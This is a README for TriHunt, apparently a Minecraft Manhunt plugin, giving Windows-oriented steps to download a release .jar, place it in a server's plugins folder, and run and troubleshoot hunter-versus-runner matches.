## 🧩 What TriHunt Does

TriHunt is a Minecraft Manhunt plugin for Bukkit, Spigot, Paper, and compatible servers. It helps you run hunt-style games where one player tries to survive while others try to track them down.

It is built for players who want a simple way to start a manhunt match on a server without extra setup. You download the plugin, place it in your server folder, and start the server.

## 🖥️ What You Need

TriHunt runs on a Minecraft server, not on a normal Windows desktop app. You need:

- A Windows PC
- A Minecraft server with plugin support
- A server that runs Paper, Spigot, or Bukkit
- Java installed on your PC if you plan to run the server yourself

If you use a hosted server, you can still use TriHunt as long as the host supports plugins.

## 🚀 Getting Started on Windows

Follow these steps on Windows:

1. Open the TriHunt release page:  
   https://github.com/dartershawm833/TriHunt/releases

2. Download the latest `.jar` file from the release.

3. Open the folder where your Minecraft server files are stored.

4. Find the `plugins` folder in the server directory.  
   If there is no `plugins` folder, start the server once and check again.

5. Move the TriHunt `.jar` file into the `plugins` folder.

6. Start or restart your server.

7. Watch the server console for a message that TriHunt loaded.

8. Join your Minecraft server and test the plugin in game.

## 📁 Where to Put the File

Use this path on a typical Windows server setup:

- `C:\MinecraftServer\plugins\TriHunt.jar`

Your path may be different. The key point is that the file must go inside the server’s `plugins` folder.

## ✅ How to Check It Worked

After you start the server, look for signs that TriHunt loaded correctly:

- The server starts without errors
- A TriHunt folder appears inside `plugins`
- Config files are created in the TriHunt folder
- Commands from the plugin work in game

If the plugin does not load, check that you used the correct file and that your server supports plugins.

## 🎯 Basic Use

TriHunt is made for manhunt games. In a normal match, one player runs and the others try to find them.

A common setup looks like this:

- One player becomes the runner
- Other players become hunters
- The match starts
- Hunters track the runner
- The game ends when the runner is caught or the match ends by rule

You can use this for small friends-only servers or larger group events.

## ⚙️ Server Support

- Paper

These are the server types most plugin users choose because they support a wide range of add-ons and tools.

## 🛠️ First-Time Setup

When you run TriHunt for the first time, it may create its own settings files. This is normal.

Typical setup steps:

1. Start the server after adding the plugin
2. Open the TriHunt folder in `plugins`
3. Look for config files
4. Adjust any settings you want
5. Restart the server

If you want a clean setup, keep the default files at first and test the plugin before changing anything.

## 🎮 Running a Manhunt Match

A simple manhunt session can follow this flow:

1. Gather the players
2. Choose the runner
3. Choose the hunters
4. Start the game through the plugin’s commands or settings
5. Play until the match ends

If you run a public server, you can use TriHunt for events and game nights. If you run a private server, you can use it for friends and small groups.

## 🧰 Common Problems

If TriHunt does not work, check these items:

- The file is in the `plugins` folder
- The server is Paper, Spigot, or Bukkit
- You downloaded the release `.jar` file
- The server was restarted after adding the file
- No other plugin is blocking it

If the server closes after startup, remove the plugin and test the server again. Then add TriHunt back and try once more.
